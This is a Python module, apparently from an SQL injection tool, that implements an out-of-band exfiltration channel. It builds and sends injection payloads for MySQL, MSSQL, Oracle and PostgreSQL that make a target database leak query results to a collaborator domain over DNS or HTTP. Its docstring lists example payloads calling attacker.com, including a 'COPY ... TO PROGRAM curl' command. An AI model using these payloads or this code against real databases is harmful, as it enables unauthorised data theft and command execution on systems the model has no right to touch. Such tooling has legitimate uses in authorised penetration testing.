"""Out-of-band channel: exfiltrate via DNS or HTTP callbacks.

This channel needs a collaborator domain (--oob-domain).  Without one,
it refuses to activate.  Supported callbacks:

  * MySQL:   LOAD_FILE(CONCAT('\\\\\\\\', (expr), '.attacker.com\\\\a'))
  * MSSQL:   EXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\a'
  * Oracle:  UTL_HTTP.REQUEST('http://attacker.com/'||(expr))
  * PG:      COPY (SELECT ...) TO PROGRAM 'curl attacker.com/...'

The payload is only sent once: the collaborator's DNS/HTTP log carries
the data.  We do NOT wait for a callback inside this module — that's
the user's job (interactsh-client, Burp Collaborator, etc.).
"""

from __future__ import annotations

from typing import Optional

from .base import Channel, ChannelInfo


class OobChannel(Channel):
    name = "oob"

    def __init__(self, cfg, client, prober=None):
        super().__init__(cfg, client, prober)
        self.dialect: str = "mysql"
        self.prefix: str = ""
        self.suffix: str = ""
        self.domain: str = ""

    def detect(self) -> Optional[ChannelInfo]:
        if not self.cfg.oob_domain:
            # silent: no domain configured
            return None
        self.domain = self.cfg.oob_domain
        return None  # can't auto-detect without callback infrastructure

    def configure(self, dialect: str, prefix: str, suffix: str,
                  domain: str) -> None:
        self.dialect = dialect
        self.prefix = prefix
        self.suffix = suffix
        self.domain = domain

    def info(self) -> ChannelInfo:
        return ChannelInfo(
            name=self.name, dialect=self.dialect,
            prefix=self.prefix, suffix=self.suffix,
            technique="oob",
            notes=f"domain={self.domain}",
        )

    def probe(self, condition: str) -> bool:
        raise NotImplementedError(
            "OobChannel does not support boolean probe"
        )

    def send_payload(self, expr: str) -> str:
        """Build and send an OOB payload. Returns the payload sent."""
        if not self.domain:
            raise RuntimeError("OobChannel requires --oob-domain")
        body = self._payload_for(expr)
        sql = f"{self.prefix}{body}{self.suffix}"
        if self.prober is not None:
            self.prober.raw_send(sql)
        return sql

    def _payload_for(self, expr: str) -> str:
        d = self.dialect.lower()
        if d == "mysql":
            # '\\\\' + (expr) + '.' + domain + '\\a'
            return (f"AND LOAD_FILE(CONCAT('\\\\\\\\',({expr}),"
                    f"'.{self.domain}\\\\a'))")
        if d == "mssql":
            return (f"; EXEC master..xp_dirtree "
                    f"'\\\\\\\\{self.domain}\\\\a'--")
        if d == "oracle":
            return (f"||(SELECT UTL_HTTP.REQUEST("
                    f"'http://{self.domain}/'||({expr})) FROM dual)||")
        if d == "postgres":
            return (f"; COPY (SELECT '') TO PROGRAM "
                    f"'curl http://{self.domain}/'||({expr})")
        return f"/* oob unsupported for {self.dialect} */"

    def extract_string(self, expr: str, length: int) -> str:
        raise NotImplementedError(
            "OOB extraction is async; check the collaborator log"
        )
